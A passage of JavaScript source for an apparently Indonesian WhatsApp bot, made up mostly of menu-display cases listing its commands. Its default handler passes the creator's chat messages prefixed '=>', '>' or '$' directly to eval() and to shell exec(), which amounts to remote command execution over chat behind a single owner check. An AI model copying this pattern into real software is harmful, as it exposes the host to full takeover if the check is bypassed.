sourceUrl: `https://youtube.com/c/HwModsWa857`,
thumbnailUrl: 'https://telegra.ph/file/a5e229afeb4dad4f35204.jpg', 
}
}}, { quoted:m})
}
break
//=================================================//
case 'scrapconvert': {
if (isBan) throw sticBanLu(from)
haikal.sendMessage(m.chat, { image: kalimage, caption: `
┏━━⊱[ SCRAPE CONVERT ]]
┣❏attp
┣❏ttp
┣❏toimage
┣❏sticker
┣❏emojimix
┣❏emojimix2
┣❏tovideo
┣❏togif
┣❏tourl
┣❏tovn
┣❏toonce
┣❏tomp3
┣❏toaudio
┣❏ebinary
┣❏dbinary
┣❏styletext
┣❏smeme
┣❏ss [url]
┗━━⊱[ banghw]`,
contextInfo:{"externalAdReply": {"title": `SC banghw`,"body": `Selamat ${salam} kak ${pushname}`,
previewType: "PHOTO",
showAdAttribution: true,
sourceUrl: `https://youtube.com/c/HwModsWa857`,
thumbnailUrl: 'https://telegra.ph/file/a5e229afeb4dad4f35204.jpg', 
}
}}, { quoted:m})
}
break
//=================================================//
case 'cmdmenu': {
if (isBan) throw sticBanLu(from)
haikal.sendMessage(m.chat, { image: kalimage, caption: `
┏━━⊱[ CMD MENU ]
┣❏setcmd
┣❏listcmd
┣❏delcmd
┣❏lockcmd
┗━━⊱[ banghw]`,
contextInfo:{"externalAdReply": {"title": `SC banghw`,"body": `Selamat ${salam} kak ${pushname}`,
previewType: "PHOTO",
showAdAttribution: true,
sourceUrl: `https://youtube.com/c/HwModsWa857`,
thumbnailUrl: 'https://telegra.ph/file/a5e229afeb4dad4f35204.jpg', 
}
}}, { quoted:m})
}
break
//=================================================//
case 'downloadmenu': {
if (isBan) throw sticBanLu(from)
haikal.sendMessage(m.chat, { image: kalimage, caption: `
*[ 🌷 ] Download Menu* 
pinterestdl [url]
mediafire [url]`,
contextInfo:{"externalAdReply": {"title": `SC banghw`,"body": `Selamat ${salam} kak ${pushname}`,
previewType: "PHOTO",
showAdAttribution: true,
sourceUrl: `https://youtube.com/c/HwModsWa857`,
thumbnailUrl: 'https://telegra.ph/file/a5e229afeb4dad4f35204.jpg', 
}
}}, { quoted:m})
}
break
//=================================================//
case 'ownermenu': {
if (isBan) throw sticBanLu(from)
haikal.sendMessage(m.chat, { image: kalimage, caption: `
┏━━⊱[ OWNER MENU ]
┣❏react [emoji]
┣❏chat [option]
┣❏join [link]
┣❏leave
┣❏afk
┣❏block @user
┣❏unblock @user
┣❏bcText [text]
┣❏setexif
┣❏ban add
┣❏ping
┣❏owner
┣❏creator
┣❏delete
┣❏infochat
┣❏quoted
┣❏cowner add 628xx
┣❏listpc
┣❏listgc
┣❏listonline
┣❏speedtest
┗━━⊱[ banghw]`,
contextInfo:{"externalAdReply": {"title": `SC banghw`,"body": `Selamat ${salam} kak ${pushname}`,
previewType: "PHOTO",
showAdAttribution: true,
sourceUrl: `https://youtube.com/c/HwModsWa857`,
thumbnailUrl: 'https://telegra.ph/file/a5e229afeb4dad4f35204.jpg', 
}
}}, { quoted:m})
}
break
//=================================================//
case 'scraperimage': {
if (isBan) throw sticBanLu(from)
haikal.sendMessage(m.chat, { image: kalimage, caption: `
┏━━⊱[ SCRAPE IMAGE ]
┣❏coffe
┣❏quotesanime
┣❏couple
┣❏wibu
┣❏loli
┣❏pat
┣❏killnom
┣❏poke
┣❏wink
┣❏bonk
┣❏glomp
┣❏smug
┣❏blush
┣❏wave
┣❏smile
┣❏highfive
┣❏cringe
┣❏dance
┣❏happy
┣❏handhold
┣❏darkjoke
┣❏meme
┣❏meme2
┗━━⊱[ banghw]`,
contextInfo:{"externalAdReply": {"title": `SC banghw`,"body": `Selamat ${salam} kak ${pushname}`,
previewType: "PHOTO",
showAdAttribution: true,
sourceUrl: `https://youtube.com/c/HwModsWa857`,
thumbnailUrl: 'https://telegra.ph/file/a5e229afeb4dad4f35204.jpg', 
}
}}, { quoted:m})
}
break
//=================================================//
/*
case 'randomsound': {
if (isBan) throw sticBanLu(from)
haikal.sendMessage(m.chat, { image: kalimage, caption: `
┏━━⊱[ Sound Menu ]
┣❏banghwsound1
┣❏banghwsound2
┣❏banghwsound3
┣❏banghwsound4
┣❏banghwsound5
┣❏banghwsound6
┣❏banghwsound7
┣❏banghwsound8
┣❏banghwsound9
┣❏banghwsound10
┣❏banghwsound11
┣❏banghwsound12
┣❏banghwsound13
┣❏banghwsound14
┣❏banghwsound15
┣❏banghwsound16
┣❏banghwsound17
┣❏banghwsound18
┣❏banghwsound19
┣❏banghwsound20
┣❏banghwsound21
┣❏banghwsound22
┣❏banghwsound23
┣❏banghwsound24
┣❏banghwsound25
┣❏banghwsound26
┣❏banghwsound27
┣❏banghwsound28
┣❏banghwsound29
┣❏banghwsound30
┣❏banghwsound31
┣❏banghwsound32
┣❏banghwsound33
┣❏banghwsound34
┣❏banghwsound35
┣❏banghwsound36
┣❏banghwsound37
┣❏banghwsound38
┣❏banghwsound39
┣❏banghwsound40
┣❏banghwsound41
┣❏banghwsound42
┣❏banghwsound43
┣❏banghwsound44
┣❏banghwsound45
┣❏banghwsound46
┣❏banghwsound47
┣❏banghwsound48
┣❏banghwsound49
┣❏banghwsound50
┣❏banghwsound51
┣❏banghwsound52
┣❏banghwsound53
┣❏banghwsound54
┣❏banghwsound55
┣❏banghwsound56
┣❏banghwsound57
┣❏banghwsound58
┣❏banghwsound59
┣❏banghwsound60
┣❏banghwsound61
┣❏banghwsound62
┣❏banghwsound63
┣❏banghwsound64
┣❏banghwsound65
┣❏banghwsound66
┣❏banghwsound67
┣❏banghwsound68
┣❏banghwsound69
┣❏banghwsound70
┣❏banghwsound71
┣❏banghwsound72
┣❏banghwsound73
┣❏banghwsound74
┣❏banghwsound75
┣❏banghwsound76
┣❏banghwsound77
┣❏banghwsound78
┣❏banghwsound79
┣❏banghwsound80
┣❏banghwsound81
┣❏banghwsound82
┣❏banghwsound83
┣❏banghwsound84
┣❏banghwsound85
┣❏banghwsound86
┣❏banghwsound87
┣❏banghwsound88
┣❏banghwsound89
┣❏banghwsound90
┣❏banghwsound91
┣❏banghwsound92
┣❏banghwsound93
┣❏banghwsound94
┣❏banghwsound95
┣❏banghwsound96
┣❏banghwsound97
┣❏banghwsound98
┣❏banghwsound99
┣❏banghwsound100
┣❏banghwsound101
┣❏banghwsound102
┣❏banghwsound103
┣❏banghwsound104
┣❏banghwsound105
┣❏banghwsound106
┣❏banghwsound107
┣❏banghwsound108
┣❏banghwsound109
┣❏banghwsound110
┣❏banghwsound111
┣❏banghwsound112
┣❏banghwsound113
┣❏banghwsound114
┣❏banghwsound115
┣❏banghwsound116
┣❏banghwsound117
┣❏banghwsound118
┣❏banghwsound119
┣❏banghwsound120
┣❏banghwsound121
┣❏banghwsound122
┣❏banghwsound123
┣❏banghwsound124
┣❏banghwsound125
┣❏banghwsound126
┣❏banghwsound127
┣❏banghwsound128
┣❏banghwsound129
┣❏banghwsound130
┣❏banghwsound131
┣❏banghwsound132
┣❏banghwsound133
┣❏banghwsound134
┣❏banghwsound135
┣❏banghwsound136
┣❏banghwsound137
┣❏banghwsound138
┣❏banghwsound139
┣❏banghwsound140
┣❏banghwsound141
┣❏banghwsound142
┣❏banghwsound143
┣❏banghwsound144
┣❏banghwsound145
┣❏banghwsound146
┣❏banghwsound147
┣❏banghwsound148
┣❏banghwsound149
┣❏banghwsound150
┣❏banghwsound151
┣❏banghwsound152
┣❏banghwsound153
┣❏banghwsound154
┣❏banghwsound155
┣❏banghwsound156
┣❏banghwsound157
┣❏banghwsound158
┣❏banghwsound159
┣❏banghwsound160
┣❏banghwsound161
┗━━⊱[ © banghw]`,
contextInfo:{"externalAdReply": {"title": `SC © banghw`,"body": `Selamat ${salam} kak ${pushname}`,
previewType: "PHOTO",
showAdAttribution: true,
sourceUrl: `https://youtube.com/c/HwModsWa857`,
thumbnailUrl: 'https://telegra.ph/file/a5e229afeb4dad4f35204.jpg', 
}
}}, { quoted:m})
}
break*/
//=================================================//
default:
if (budy.startsWith('=>')) {
if (!isCreator) return
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)}
return m.reply(bang)}
try {
m.reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
m.reply(String(e))}}
if (budy.startsWith('>')) {
if (!isCreator) return sticOwner(from)
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
await m.reply(String(err))}}
if (budy.startsWith('$')) {
if (!isCreator) return 
exec(budy.slice(2), (err, stdout) => {
if(err) return m.reply(err)
if (stdout) return m.reply(stdout)})}
//=================================================//
//=================================================//
if (isCmd && budy.toLowerCase() != undefined) {
if (m.chat.endsWith('broadcast')) return
if (m.isBaileys) return
let msgs = global.db.database
if (!(budy.toLowerCase() in msgs)) return
haikal.copyNForward(m.chat, msgs[budy.toLowerCase()], true)}}
} catch (err) {
m.reply(util.format(err))}}
//=================================================//
let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.redBright(`Update ${__filename}`))
delete require.cache[file]
require(file)
})